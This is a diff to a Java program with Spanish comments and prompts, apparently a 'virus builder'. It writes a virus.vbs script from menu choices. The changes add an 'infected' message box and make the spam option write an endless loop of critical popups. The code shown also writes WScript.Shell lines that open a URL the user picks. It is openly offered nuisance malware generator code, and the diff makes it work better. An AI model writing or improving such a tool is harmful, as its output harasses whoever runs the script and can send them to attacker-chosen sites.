@@ -23,14 +23,13 @@ public class VBSspanish {
         File virus = new File("virus.vbs");
         try {
             PrintWriter salidaVirus = new PrintWriter(new FileWriter(virus, true));
-
+            salidaVirus.println("msgbox(\"" + "Has sido infectado por el virus: " + nombreVirus + "\")");
             System.out.println("Ahora selecciona lo que quieres que tu virus haga: ");
 
             for (int i = 0; i <= 1000; i++) {
                 int option;
                 mostrarOpciones();
                 option = Integer.parseInt(scanner.nextLine());
-                salidaVirus.println(nombreVirus);
 
                 //ACCIONES
                 if (option == 1)
@@ -46,7 +45,6 @@ public class VBSspanish {
                     System.out.println("Ahora dime a que URL quieres que redirija el virus: ");
                     redirectURL = scanner.nextLine();
                     salidaVirus.println("Dim wShell");
-                    salidaVirus.println(" ");
                     salidaVirus.println("Set wShell = CreateObject(\"WScript.Shell\")");
                     salidaVirus.println("wShell.Run \"" + redirectURL + "\"" + ",9");
                 }
@@ -68,7 +66,7 @@ public class VBSspanish {
                     String mensajeSpam;
                     System.out.println("Dime que mensaje quieres que el programa haga spam: ");
                     mensajeSpam = scanner.nextLine();
-                    salidaVirus.println("x=MsgBox(\"" + mensajeSpam + "\"," + "vbOkOnly+vbCritical," + "\"" + mensajeSpam + "\"" + ")" + "\n" + "loop");
+                    salidaVirus.println("do" + "\n" + "x=MsgBox(\"" + mensajeSpam + "\"," + "vbOkOnly+vbCritical," + "\"" + mensajeSpam + "\"" + ")" + "\n" + "loop");
                 }
                 else if (option == 6)
                 {
